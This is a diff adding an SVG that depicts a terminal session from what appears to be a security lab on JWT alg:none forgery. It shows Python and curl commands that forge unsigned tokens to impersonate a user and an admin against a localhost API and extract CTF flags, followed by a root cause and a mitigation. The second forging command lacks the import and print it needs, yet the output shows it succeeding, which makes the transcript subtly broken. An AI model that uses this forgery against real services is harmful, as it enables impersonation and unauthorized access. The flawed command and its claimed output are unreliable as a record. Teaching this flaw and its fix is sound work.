@@ -1,0 +1,21 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="880" height="370" font-family="'Menlo','Courier New',monospace" font-size="13">
+  <rect width="880" height="370" rx="8" fill="#1e1e2e"/>
+  <rect x="0" y="0" width="880" height="28" rx="8" fill="#313244"/>
+  <circle cx="16" cy="14" r="5" fill="#f38ba8"/><circle cx="32" cy="14" r="5" fill="#a6e3a1"/><circle cx="48" cy="14" r="5" fill="#f9e2af"/>
+  <text x="440" y="18" fill="#cdd6f4" text-anchor="middle" font-size="11">Task 2 — JWT Forgery via alg:none (CWE-347)</text>
+  <text x="12" y="52" fill="#a6e3a1" font-size="12">$ printf '%s | %s | ' "$(whoami)" '6631503092'; date '+%F %T %Z'</text>
+  <text x="12" y="70" fill="#cdd6f4" font-size="12">thomas | 6631503092 | 2026-09-13 16:51:15 +07</text>
+  <text x="12" y="98" fill="#a6e3a1" font-size="12">$ FORGED=$(python3 -c "import jwt; print(jwt.encode({'sub':'bob'}, key='', algorithm='none'))")</text>
+  <text x="12" y="118" fill="#cdd6f4" font-size="11">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJib2IifQ.</text>
+  <text x="12" y="138" fill="#585b70" font-size="11">  ↑ Header: {"alg":"none"} | Payload: {"sub":"bob"} | Signature: EMPTY</text>
+  <text x="12" y="166" fill="#a6e3a1" font-size="12">$ curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"</text>
+  <text x="12" y="186" fill="#f38ba8" font-size="12">{"item":"Phone","note":"FLAG{idor_demo}","owner":"bob","total":800}</text>
+  <text x="12" y="206" fill="#f38ba8" font-size="12">  ↑ UNSIGNED token accepted — impersonating bob without any secret!</text>
+  <text x="12" y="234" fill="#a6e3a1" font-size="12">$ FORGED_ADMIN=$(python3 -c "jwt.encode({'sub':'admin'}, key='', algorithm='none')")</text>
+  <text x="12" y="254" fill="#a6e3a1" font-size="12">$ curl -s http://localhost:8080/api/admin -H "Authorization: Bearer $FORGED_ADMIN"</text>
+  <text x="12" y="274" fill="#f38ba8" font-size="12">{"flag":"FLAG{jwt_demo}"}</text>
+  <text x="12" y="294" fill="#f38ba8" font-size="12">  ↑ Admin flag extracted with forged unsigned token</text>
+  <text x="12" y="322" fill="#585b70" font-size="11">Root cause: L54-55 checks token's own alg header; if "none", skips verification entirely.</text>
+  <rect x="12" y="338" width="856" height="22" rx="3" fill="#45475a"/>
+  <text x="440" y="354" fill="#f9e2af" text-anchor="middle" font-size="11">Mitigation: solution_app.py L50 → algorithms=["HS256"] only; never trust token's alg claim</text>
+</svg>
